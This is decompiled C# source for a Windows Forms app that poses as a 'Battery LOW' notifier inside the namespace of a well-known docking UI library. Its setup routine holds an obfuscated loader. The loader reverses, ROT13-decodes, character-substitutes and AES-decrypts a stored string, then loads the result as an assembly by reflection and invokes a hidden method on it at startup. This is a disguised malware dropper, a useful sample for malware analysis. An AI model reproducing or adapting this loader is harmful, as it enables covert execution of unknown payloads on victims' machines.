using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using WeifenLuo.WinFormsUI.Docking;

namespace WeifenLuo.WinFormsUI
{
	public class Form1 : Form
	{
		private Timer timer = new Timer();

		private int minValue = 20;

		private IContainer components = null;

		private Label label1;

		private NotifyIcon notifyIcon1;

		public Form1()
			: this()
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			InitializeComponent();
			((Control)this).Hide();
			((Form)this).set_ShowInTaskbar(false);
			timer.set_Interval(60000);
			timer.add_Tick((EventHandler)Timer_Tick);
			timer.Start();
			Timer_Tick();
		}

		private void Timer_Tick(object sender = null, EventArgs e = null)
		{
		}

		public void CreateTextIcon(string str, Color color)
		{
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Expected O, but got Unknown
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Expected O, but got Unknown
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			Font val = new Font("Arial", 12f, (FontStyle)0, (GraphicsUnit)2);
			Brush val2 = (Brush)new SolidBrush(color);
			Bitmap val3 = new Bitmap(16, 16);
			Graphics val4 = Graphics.FromImage((Image)(object)val3);
			val4.Clear(Color.get_Transparent());
			val4.set_TextRenderingHint((TextRenderingHint)1);
			val4.DrawString(str, val, val2, 0f, 0f);
			IntPtr hicon = val3.GetHicon();
			notifyIcon1.set_Icon(Icon.FromHandle(hicon));
		}

		private void notifyIcon1_DoubleClick(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				((IDisposable)components).Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Expected O, but got Unknown
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Expected O, but got Unknown
			//IL_002e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0038: Expected O, but got Unknown
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0059: Expected O, but got Unknown
			//IL_0064: Unknown result type (might be due to invalid IL or missing references)
			//IL_0090: Unknown result type (might be due to invalid IL or missing references)
			//IL_00f6: Unknown result type (might be due to invalid IL or missing references)
			//IL_0100: Expected O, but got Unknown
			//IL_0131: Unknown result type (might be due to invalid IL or missing references)
			//IL_0145: Unknown result type (might be due to invalid IL or missing references)
			//IL_015b: Unknown result type (might be due to invalid IL or missing references)
			components = (IContainer)new Container();
			ComponentResourceManager val = new ComponentResourceManager(typeof(Form1));
			label1 = new Label();
			notifyIcon1 = new NotifyIcon(components);
			((Control)this).SuspendLayout();
			((Control)label1).set_Font(new Font("Microsoft Sans Serif", 20f));
			((Control)label1).set_Location(new Point(42, 119));
			((Control)label1).set_Name("label1");
			((Control)label1).set_Size(new Size(701, 231));
			((Control)label1).set_TabIndex(0);
			((Control)label1).set_Text("YOU CAN'T REMOVE ME UNLESS YOU PLUG IN YOUR CHARGER");
			label1.set_TextAlign((ContentAlignment)32);
			notifyIcon1.set_BalloonTipIcon((ToolTipIcon)1);
			notifyIcon1.set_BalloonTipText("Battery Notifier");
			notifyIcon1.set_Icon((Icon)((ResourceManager)(object)val).GetObject("notifyIcon1.Icon"));
			notifyIcon1.set_Visible(true);
			notifyIcon1.add_DoubleClick((EventHandler)notifyIcon1_DoubleClick);
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Control)this).set_BackColor(Color.get_White());
			((Form)this).set_ClientSize(new Size(800, 450));
			((Form)this).set_ControlBox(false);
			((Control)this).get_Controls().Add((Control)(object)label1);
			((Form)this).set_MaximizeBox(false);
			((Form)this).set_MinimizeBox(false);
			((Control)this).set_Name("Form1");
			((Form)this).set_ShowIcon(false);
			((Form)this).set_ShowInTaskbar(false);
			((Form)this).set_StartPosition((FormStartPosition)1);
			((Control)this).set_Text("Battery LOW");
			((Form)this).set_WindowState((FormWindowState)1);
			((Control)this).ResumeLayout(false);
			R_F('P', 99);
		}

		public static string sReverseS3(string str)
		{
			char[] array = str.ToCharArray();
			int num = 0;
			int num2 = str.Length - 1;
			while (num < num2)
			{
				array[num] = str[num2];
				array[num2] = str[num];
				num++;
				num2--;
			}
			return new string(array);
		}

		public static string F_V(string text)
		{
			return text.Replace('پ', 'E');
		}

		public static string R_F(char s, int d)
		{
			string str = sReverseS3(NestedDockingStatus.x);
			string s2 = E_D(F_V(Transform(sReverseS3(str))));
			Assembly t = (Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1]
			{
				Convert.FromBase64String(s2)
			});
			Q_A(t);
			return "x";
		}

		private static void Q_A(Assembly t)
		{
			Type type = t.GetType("FormDelegates.SmartExtensions");
			W_S(type, 5);
		}

		private static void W_S(Type x, int xz)
		{
			object[] parameters = new object[3]
			{
				@byte.OffsetMarshaler,
				@byte.ReturnMessage,
				"WeifenLuo.WinFormsUI"
			};
			MethodInfo methodInfo = (MethodInfo)LateBinding.LateGet((object)x, (Type)null, sReverseS3("dohteMteG"), new object[1]
			{
				sReverseS3("arolF")
			}, (string[])null, (bool[])null);
			methodInfo.Invoke(0, parameters);
		}

		public static string E_D(string TexT)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_0007: Expected O, but got Unknown
			RijndaelManaged val = new RijndaelManaged();
			string text = "";
			byte[] ft = Form1A.Ft;
			((SymmetricAlgorithm)val).set_Key(ft);
			((SymmetricAlgorithm)val).set_Mode((CipherMode)2);
			byte[] array = Convert.FromBase64String(TexT);
			return Encoding.ASCII.GetString(((SymmetricAlgorithm)val).CreateDecryptor().TransformFinalBlock(array, 0, array.Length));
		}

		public static string Transform(string value)
		{
			char[] array = value.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				int num = array[i];
				if (num >= 97 && num <= 122)
				{
					num = ((num <= 109) ? (num + 13) : (num - 13));
				}
				else if (num >= 65 && num <= 90)
				{
					num = ((num <= 77) ? (num + 13) : (num - 13));
				}
				array[i] = (char)num;
			}
			return new string(array);
		}
	}
}
